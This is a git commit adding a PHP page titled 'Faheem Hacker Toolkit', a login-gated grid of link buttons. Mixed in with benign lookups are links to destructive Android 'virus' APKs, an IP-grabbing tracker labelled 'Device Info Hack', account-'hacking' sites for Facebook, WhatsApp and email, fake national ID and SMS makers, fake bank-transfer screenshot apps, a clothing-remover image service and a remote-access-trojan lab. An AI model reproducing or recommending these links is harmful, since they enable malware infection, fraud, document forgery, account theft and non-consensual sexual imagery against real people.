26de40637ce01ddc6be1f7e16c6e508326825b1c
MALiJAN <154499913+MALiJAN@users.noreply.github.com>
2024-08-31 16:49:52 +0500

    index.php

---
+++ index.php
@@ -0,0 +1,594 @@
+<?php
+session_start();
+
+// Check if user is not logged in, redirect to login page
+if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
+    header("location: login.php");
+    exit;
+}
+
+// Logout functionality
+if(isset($_POST["logout"])){
+    session_destroy();
+    header("location: login.php");
+    exit;
+}
+?>
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   
+
+  <title>🔥 Faheem Hacker Toolkit 🔥</title>
+  
+  <br>
+  <div></div>
+	<!-- Navbar -->
+	
+	
+			</a>
+		 	<!--<a href="?logout" type="submit" name="logout" class="w3-padding-large w3-hover-red w3-bar-item w3-right"><i class="fa fa-sign-out fa-lg"></i></a> -->
+		</div>
+	</div>
+<p></p>
+		<br>
+<h2 style="text-align: center;"><span style="color: #ccffff;"><strong><em>🔥 Faheem Hacker Toolkit 🔥</em></strong></span></h2>
+		<br>
+		
+<div
+              </div>
+          
+          </div>
+          
+		
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+ 
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+<style>
+body {
+ background-image: url("https://www.pngmagic.com/product_images/sky-blue-hd-background-image-for-banner.jp");
+ background-color: #24242b;
+}
+#pageloader
+{
+  background: rgba( 255, 255, 255, 0.8 );
+  height: 100%;
+  display:none;
+  position: relative;
+  width: 100%;
+  z-index: 9999;
+}
+
+#pageloader img
+{
+  position: absolute;
+  margin-left: 35%;
+  margin-top: 30%;
+  width:auto;
+  max-height:100px;
+}
+#loader{
+	position: fixed;
+	width: 100%;
+	height: 100vh;
+	background: #21242d url('https://cssauthor.com/wp-content/uploads/2018/06/Bouncy-Preloader.gif') no-repeat center;
+	z-index: 999;
+}
+@media screen and (max-width: 576px) {
+#pageloader img
+{
+  position: absolute;
+  margin-left: 10%;
+  margin-top: 70%;
+  width:auto;
+  max-height:100px;
+  background: #21242d url('https://cssauthor.com/wp-content/uploads/2018/06/Bouncy-Preloader.gif') no-repeat center;
+  	z-index: 999;
+}
+    
+}
+    
+</style>
+<style>
+body {
+  background-image: url('https://w0.peakpx.com/wallpaper/737/730/HD-wallpaper-anonymous-hackers-hacking.jpg');
+  background-repeat: no-repeat;
+  background-attachment: fixed;  
+  background-size: cover;
+  background-size: 100% 100%;
+}
+</style>
+</head>
+      
+<body>
+
+   
+                </div>
+            </div>
+        </div>
+    </div>
+    
+ <nav class="navbar navbar-inverse">
+  <div class="container-fluid">
+    <div class="navbar-header">
+  
+
+          
+       
+         <div class="w3-row-padding w3-margin-bottom" style="text-align: center;">
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://tajammalmods.xyz/T.php">Sim Data 2024</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://link4earn.in/J3Sb7a.php">YouTube premium</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.imei.info/">IMEI check</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://cnic.sims.pk/">SIM Rigestration check</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://chat.openai.com">Chat gpt </a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://excise.gos.pk/">Punjab vehicle Check</a>
+     
+      
+     
+      </div>
+     
+
+      
+     
+      
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://vehicleverification.pk/">Sindh vehicle check</a>
+      </div>
+
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.kpexcise.gov.pk/">kpk vehicle check</a>
+      </div>
+    
+       
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://nims.nadra.gov.pk/nims/">COVID-19 Check</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://idcards.pw/">Fake CNIC Maker</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://zefoy.com/">TikTok Views Trick</a>
+  </div>
+        <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://pakpoll.com/cnic/">CNIC INFO</a>
+  </div>
+      <div>
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://dlims.punjab.gov.pk/verify/">Dlmis Punjab verification</a>
+      </div>
+     <div class="w3-row-padding w3-margin-bottom" style="text-align: center;">
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://dls.gos.pk/">Dlmis Sindh check</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://mepcobill.pk/">MEPCO Bill Check online</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://grabify.link/track/HY9HN8">Device Info Hack</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://account.st/facebook/">Facebook Hack</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://temp-mail.org/en/">Temp Mail</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/iyngfbomye8axh3/Android+reset+.apk/file">Android Virus Tool</a>
+     
+      
+     
+      </div>
+     
+
+      
+     
+      
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/4qrvq9r98lq8xkc/Delete+everything+virus.apk/file">Delete everything apk</a>
+      </div>
+
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://clothoff.app/r/clmjdmgah0oyyzy6b3si3fv3o">Cloth remover</a>
+      </div>
+    
+       
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.onlineHacking.org">All craxsrat lab setup</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://mega.nz/folder/A2QUjJYR#Vv0xbGm30InMD5kG_tQSWw">Ethnical Hacking course</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://mega.nz/folder/Z5szVLDK#RugBixrFIVJ2H5OE3gbEUQ">Dark web</a>
+  </div>
+        <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://anon.djrudrabasti.in/?go=02fd86eb">Netflix periumum</a>
+  </div>
+      <div>
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/c23bh1p5dr09ogi/Fake_Ids_maker%2528for_Pakistani%2529.apk/file">Pakistan id card </a>
+      </div>
+     <div class="w3-row-padding w3-margin-bottom" style="text-align: center;">
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/7nwqrvas6pbr9fz/Fake_Ids_maker%2528for_indians%2529.apk/file">Indian id card</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/5eme3a9ddhi6u80/TG_Fake_Chat.apk/file">Fake Telegram chat</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/4eobtvyo8qqfcmy/EasyPaisa_to_All_bank.apk/file">Easypisa All bank ss</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/h9fonbmc5ugaf9i/base-1.apk/file">Fake Trading SS</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://Wa.me/+994400744050by/?text=FAHEEM.HACKED((☞┾≛⃝😈😎">All Premium app</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/jfti59dm93lou5c/%25F0%259F%2593%25B5UNBANNED_APK%25F0%259F%259A%25AD.apk/file">Whatsapp unbanned apk</a>
+     
+      
+     
+      </div>
+     
+
+      
+     
+      
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://tajammalmods.xyz/index.php?search=">CNIC Detaile</a>
+      </div>
+
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://drive.google.com/drive/folders/13CH5VBHnBFQlQ900vMEZr4_YXHCeaINA.php">Unlimited Gmail Trick</a>
+      </div>
+    
+       
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.mediafire.com/file/s0tjqme7rfptrrl/Create_Fake_Sms.apk/file.php">Fake Sms Maker</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://callmyphone.org">Private Call </a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://anonymsms.com/temporary-phone-number/">Fake Whatsapp number</a>
+  </div>
+        <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://account.st/whatsapp/">Hack Whatsapp number</a>
+  </div>
+      <div>
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://account.st/gmail/">Hack Email account</a>
+      </div>
+     <div class="w3-row-padding w3-margin-bottom" style="text-align: center;">
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://quran.com/en">Quran PAK</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://pranx.com/hacker/    "> Hacking Lab 1 Hack data </a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://www.pramuwaskito.org/game/typer/">prank 2 Hack</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://locateanumber.com/locate/">Location Hack</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://Wa.me/+923287621448by/?text=FAHEEM.HACKED((☞┾≛⃝😈😎">Mobile Hack Software</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="https://chat.whatsapp.com/HWvqiyGBSATKWgtLmC5T6L">Join My Group</a>
+     
+      
+     
+      </div>
+     
+
+      
+     
+      
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="b/liv.php">location trace</a>
+      </div>
+
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="b/fak.php">Fake cnic</a>
+      </div>
+    
+       
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="b/wha.php">Whtsap unban</a>
+      </div>
+       <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="b/logwha.php">Whtsap logout</a>
+      </div>
+      <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="b/issu.php">Cnic issue date</a>
+  </div>
+        <div class="w3-col s6 l2 w3-padding-16">
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="b/mhack.php">Mobile Hacking</a>
+  </div>
+      <div>
+        <a class="w3-button w3-block w3-aqua w3-round-large" href="b/paid.php">Paid services</a>
+      </div>
+      
+
+
+    
+</nav>
+
+<!DOCTYPE html>
+<html>
+<head>
+
+<style>
+  .Marquee-box {
+     position: relative;
+     display: inline-block;
+     width: autopx;
+     height: 80px;
+     -webkit-perspective: 500px;
+             perspective: 500px;
+     top: auto;
+     left: auto;
+     z-index: 100;
+  }
+  .MyMarquee {
+     text-align: center;
+     font-weight: bold;
+     width: 100%;
+     height: 50%;
+     font-size: 25px;
+     border: 1px solid black;
+     color: #FFFFFF;
+     font-family: Arial, Helvetica, sans-serif;
+     vertical-align: middle;
+     -webkit-box-sizing: border-box;
+        -moz-box-sizing: border-box;
+             box-sizing: border-box;
+     background: -webkit-linear-gradient(90deg, #8A088F 5%, #F705CF 100%);
+     background:    -moz-linear-gradient(90deg, #8A088F 5%, #F705CF 100%);
+     background:     -ms-linear-gradient(90deg, #8A088F 5%, #F705CF 100%);
+
+     box-shadow: 5px 5px 10px 0px #A3A3A3;
+     transform: rotateX(10deg);
+     transform-origin: 50% 50% 0px;
+  }
+  .MyMarquee div {
+     display: inline-block;
+     vertical-align: middle;
+  }
+  .MyMarquee a, .MyMarquee img {
+     display: inline-block;
+     text-decoration: underline;
+     color: aqua;
+     vertical-align: middle;
+  }
+
+</style>
+</head>
+<body>
+
+
+
+
+</body>
+</html>
+        </div>
+</div>
+
+
+
+
+</div>
+
+          </div>
+          
+<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>
+<!------ Include the above in your HEAD tag ---------->
+<style> 
+input[type=text] {
+  width: 80%;
+  padding: 12px 20px;
+  margin: 8px 0;
+  box-sizing: border-box;
+  border: 3px solid #ccc;
+  -webkit-transition: 0.5s;
+  transition: 0.5s;
+  outline: none;
+}
+
+input[type=text]:focus {
+  border: 3px solid #555;
+}
+</style>
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
+  </head>
+  <body>
+    
+    
+    
+    
+    
+     <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
+  </body>
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+
+
+<style>
+ body{
+  background-color: black; /* black */
+ }
+  h3{
+  color:white;
+  }
+}
+.button {
+  background-color: red; /* black */
+  border: 5px;
+  color: white;
+  padding: 8px 12px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 14px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+
+.button1 {border-radius: 4px;}
+.button2 {border-radius: 4px;}
+.button3 {border-radius: 4px;}
+.button4 {border-radius: 4px;}
+.button5 {border-radius: 20px;}
+
+.button2 {background-color: red;} /* red */
+.button3 {background-color: black;} /* black */ 
+.button4 {background-color: blue; color: blue;} /* Gray */ 
+.button5 {background-color: red;} /* Green */
+.button6 {background-color: yellow;} /* yellow */
+</style>
+ <style type="text/css">
+  body,h1,h2,h3,h4,h5 {font-family: 'Roboto', sans-serif}
+  table {
+    border: 5px solid #077866;
+    border-collapse: collapse;
+    margin: 0;
+    padding: 20;
+    width: 80%;
+    table-layout: fixed;
+  }
+
+  table caption {
+    font-size: 2.5em;
+    margin: 10.5em 0 .75em;
+  }
+
+  table tr {
+    background-color: black;
+    border: 10px solid #3399FF;
+    padding: 1.35em;
+    color: white;
+  }
+
+  table th,
+  table td {
+    padding: .625em;
+    text-align: left;
+  }
+
+  table th {
+    font-size: 3.85em;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+  }
+
+  @media screen and (max-width: 600px) {
+    table {
+      border: 0;
+    }
+
+    table caption {
+      font-size: 1.3em;
+    }
+
+    table thead {
+      border: 5px;
+      clip: rect(0 0 0 0);
+      height: 1px;
+      margin: -1px;
+      overflow: hidden;
+      padding: 0;
+      position: absolute;
+      width: 1px;
+    }
+
+    
+
+    h3 {
+      border: 5px;
+      color: black;
+      
+      
+      
+      
+    }
+
+    table tr {
+      border-bottom: 3px solid #ddd;
+      display: block;
+      margin-bottom: .625em;
+    }
+
+    table td {
+      border-bottom: 1px solid #ddd;
+      display: block;
+      font-size: .8em;
+      text-align: br;
+    }
+
+    table td::before {
+    content: attr(data-label);
+    float: left;
+    font-size: 20;
+    color: yellow;
+    font-weight: bold;
+    text-transform: uppercase;
+  }
+  
+  table td:last-child {
+    border-bottom: 0;
+  }
+}
+</style>
+<h2 style="text-align: center;"><span style="color: #ccffff;"><strong><em>🔥 Faheem Hacker:923287621448🔥</em></strong></span></h2>
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+    </div>
+    
+  
